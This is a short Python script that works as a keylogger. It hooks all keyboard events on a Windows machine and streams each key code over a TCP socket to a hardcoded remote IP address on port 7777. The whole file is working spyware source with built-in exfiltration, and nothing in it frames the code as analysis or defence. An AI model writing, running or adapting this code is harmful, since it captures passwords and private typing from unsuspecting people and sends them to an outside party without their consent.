import socket
import pythoncom
import pyWinhook as pyhook


def on_keyboard_event(event, server_socket):
    if event.KeyID > 0:
        key_code = str(event.KeyID).encode()
        server_socket.sendall(key_code)
    return True


def main():
    # Create a hook manager
    hook_manager = pyhook.HookManager()

    # Open a socket connection
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('142.10.10.2', 7777)
    server_socket.connect(server_address)
    
    # Register the keyboard event handler
    hook_manager.KeyDown = lambda event: on_keyboard_event(event, server_socket)
    
    # Hook the keyboard events
    hook_manager.HookKeyboard()
    
    # Start the message loop to receive events
    pythoncom.PumpMessages()


if __name__ == "__main__":
    main()
